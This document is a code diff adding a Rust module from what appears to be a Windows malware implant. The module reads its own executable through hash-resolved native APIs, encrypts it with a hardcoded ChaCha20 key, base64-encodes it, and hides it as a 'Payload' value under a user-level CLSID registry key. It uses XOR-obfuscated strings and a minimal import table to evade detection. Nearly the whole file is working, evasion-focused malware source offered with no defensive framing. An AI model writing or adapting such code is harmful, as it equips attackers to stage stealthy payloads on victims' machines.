@@ -1,0 +1,255 @@
+//! # Registry Storage (Dynamic API) - HARDENED + ENCRYPTED
+//!
+//! Stores ChaCha20 encrypted payload in Registry using native API.
+//! NO winreg crate = minimal import table.
+
+use std::ffi::c_void;
+use std::ptr;
+use log::debug;
+use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+
+use super::api_resolver::{self, djb2};
+
+// XOR Helper (Key 0x55)
+fn x(bytes: &[u8]) -> String {
+    let key = 0x55;
+    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
+    String::from_utf8(decoded).unwrap_or_default()
+}
+
+// ChaCha20 Key (32 bytes) - MUST MATCH LOADER
+const CHACHA_KEY: [u8; 32] = [
+    0x50, 0x68, 0x61, 0x6E, 0x74, 0x6F, 0x6D, 0x4D,
+    0x65, 0x73, 0x68, 0x4B, 0x65, 0x79, 0x32, 0x30,
+    0x32, 0x36, 0x5F, 0x53, 0x65, 0x63, 0x72, 0x65,
+    0x74, 0x4B, 0x65, 0x79, 0x21, 0x40, 0x23, 0x24,
+];
+
+const CHACHA_NONCE: [u8; 12] = [0x50, 0x48, 0x4D, 0x4E, 0x4F, 0x4E, 0x43, 0x45, 0x30, 0x30, 0x30, 0x31];
+
+// Registry API hashes
+const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
+const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
+const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
+const HASH_ADVAPI32: u32 = 0x03C6B585;
+
+// API Types
+type RegCreateKeyExW = unsafe extern "system" fn(
+    hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16,
+    dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const c_void,
+    phkResult: *mut isize, lpdwDisposition: *mut u32
+) -> i32;
+
+type RegSetValueExW = unsafe extern "system" fn(
+    hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32,
+    lpData: *const u8, cbData: u32
+) -> i32;
+
+type RegCloseKey = unsafe extern "system" fn(hKey: isize) -> i32;
+
+const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
+const KEY_ALL_ACCESS: u32 = 0xF003F;
+const REG_SZ: u32 = 1;
+
+/// Convert string to wide string for Windows API
+fn to_wide(s: &str) -> Vec<u16> {
+    s.encode_utf16().chain(std::iter::once(0)).collect()
+}
+
+/// Simple base64 encode (no external crate)
+fn base64_encode(data: &[u8]) -> String {
+    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut result = String::new();
+    
+    for chunk in data.chunks(3) {
+        let n = match chunk.len() {
+            3 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8) | (chunk[2] as u32),
+            2 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8),
+            1 => (chunk[0] as u32) << 16,
+            _ => 0,
+        };
+        
+        result.push(ALPHABET[((n >> 18) & 0x3F) as usize] as char);
+        result.push(ALPHABET[((n >> 12) & 0x3F) as usize] as char);
+        
+        if chunk.len() > 1 {
+            result.push(ALPHABET[((n >> 6) & 0x3F) as usize] as char);
+        } else {
+            result.push('=');
+        }
+        
+        if chunk.len() > 2 {
+            result.push(ALPHABET[(n & 0x3F) as usize] as char);
+        } else {
+            result.push('=');
+        }
+    }
+    
+    result
+}
+
+/// Read the current executable's bytes using native Windows API only.
+/// Avoids std::fs::read() to minimize import table.
+#[cfg(target_os = "windows")]
+unsafe fn read_self_native() -> Result<Vec<u8>, String> {
+    use api_resolver::*;
+    
+    // API types
+    type GetModuleFileNameW = unsafe extern "system" fn(isize, *mut u16, u32) -> u32;
+    type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const c_void, u32, u32, isize) -> isize;
+    type GetFileSize = unsafe extern "system" fn(isize, *mut u32) -> u32;
+    type ReadFile = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32;
+    type CloseHandle = unsafe extern "system" fn(isize) -> i32;
+    
+    // Resolve APIs
+    let get_module_file_name: GetModuleFileNameW = resolve_api(HASH_KERNEL32, djb2(b"GetModuleFileNameW"))
+        .ok_or("GetModuleFileNameW not found")?;
+    let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
+        .ok_or("CreateFileW not found")?;
+    let get_file_size: GetFileSize = resolve_api(HASH_KERNEL32, djb2(b"GetFileSize"))
+        .ok_or("GetFileSize not found")?;
+    let read_file: ReadFile = resolve_api(HASH_KERNEL32, HASH_READ_FILE)
+        .ok_or("ReadFile not found")?;
+    let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
+        .ok_or("CloseHandle not found")?;
+    
+    // Get current executable path
+    let mut path_buf = [0u16; 260];
+    let len = get_module_file_name(0, path_buf.as_mut_ptr(), 260);
+    if len == 0 { return Err("GetModuleFileNameW failed".to_string()); }
+    
+    // Open file for reading
+    // GENERIC_READ=0x80000000, FILE_SHARE_READ=1, OPEN_EXISTING=3
+    let handle = create_file(path_buf.as_ptr(), 0x80000000, 1, ptr::null(), 3, 0, 0);
+    if handle == -1 { return Err("CreateFileW failed".to_string()); }
+    
+    // Get file size
+    let size = get_file_size(handle, ptr::null_mut());
+    if size == 0xFFFFFFFF { 
+        close_handle(handle);
+        return Err("GetFileSize failed".to_string()); 
+    }
+    
+    // Read file
+    let mut buffer = vec![0u8; size as usize];
+    let mut bytes_read: u32 = 0;
+    let result = read_file(handle, buffer.as_mut_ptr(), size, &mut bytes_read, ptr::null());
+    close_handle(handle);
+    
+    if result == 0 { return Err("ReadFile failed".to_string()); }
+    if bytes_read != size { buffer.truncate(bytes_read as usize); }
+    
+    Ok(buffer)
+}
+
+/// Install the current executable blob into Registry (Encrypted)
+/// Uses NATIVE API only - no winreg crate, no std::fs
+pub fn install_self_to_registry() -> Result<String, String> {
+    #[cfg(target_os = "windows")]
+    unsafe {
+        debug!("Storing encrypted payload (native API)...");
+
+        // Read current executable using native API
+        let data = read_self_native()?;
+        let mut data = data; // Make mutable for encryption
+
+        // Encrypt with ChaCha20
+        let mut cipher = ChaCha20::new(&CHACHA_KEY.into(), &CHACHA_NONCE.into());
+        cipher.apply_keystream(&mut data);
+        
+        debug!("Encrypted {} bytes", data.len());
+
+        // Base64 encode
+        let b64_data = base64_encode(&data);
+
+        // Build registry path (XOR obfuscated)
+        let clsid = "{e403d151-54b0-466d-8958-69225785f78a}";
+        let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
+        let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
+        let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
+        
+        let path = format!("{}\\{}\\{}\\{}", p1, p2, p3, clsid);
+        let path_wide = to_wide(&path);
+
+        // Resolve Registry APIs from advapi32.dll
+        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32);
+        if advapi32.is_none() {
+            // advapi32 might not be loaded, try loading it
+            type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
+            let load_lib: LoadLibraryA = api_resolver::resolve_api(
+                api_resolver::HASH_KERNEL32, 
+                api_resolver::HASH_LOAD_LIBRARY_A
+            ).ok_or("Failed to resolve LoadLibraryA")?;
+            
+            // "advapi32.dll" XOR 0x55
+            let dll_name = b"advapi32.dll\0";
+            load_lib(dll_name.as_ptr());
+        }
+        
+        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
+            .ok_or("Failed to get advapi32")?;
+
+        let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
+            .map(|p| std::mem::transmute(p))
+            .ok_or("Failed to resolve RegCreateKeyExW")?;
+            
+        let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
+            .map(|p| std::mem::transmute(p))
+            .ok_or("Failed to resolve RegSetValueExW")?;
+            
+        let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
+            .map(|p| std::mem::transmute(p))
+            .ok_or("Failed to resolve RegCloseKey")?;
+
+        // Create registry key
+        let mut hkey: isize = 0;
+        let mut disposition: u32 = 0;
+        
+        let status = reg_create(
+            HKEY_CURRENT_USER,
+            path_wide.as_ptr(),
+            0,
+            ptr::null(),
+            0,
+            KEY_ALL_ACCESS,
+            ptr::null(),
+            &mut hkey,
+            &mut disposition
+        );
+        
+        if status != 0 {
+            return Err(format!("RegCreateKeyExW failed: {}", status));
+        }
+
+        // Set value (Payload)
+        let val_name = x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]); // Payload
+        let val_name_wide = to_wide(&val_name);
+        
+        // Convert base64 string to wide string for REG_SZ
+        let b64_wide = to_wide(&b64_data);
+        
+        let status = reg_set(
+            hkey,
+            val_name_wide.as_ptr(),
+            0,
+            REG_SZ,
+            b64_wide.as_ptr() as *const u8,
+            (b64_wide.len() * 2) as u32
+        );
+        
+        reg_close(hkey);
+        
+        if status != 0 {
+            return Err(format!("RegSetValueExW failed: {}", status));
+        }
+
+        debug!("Encrypted blob stored (native API)");
+        
+        Ok(path)
+    }
+    
+    #[cfg(not(target_os = "windows"))]
+    {
+        Err("Registry operations only supported on Windows".to_string())
+    }
+}
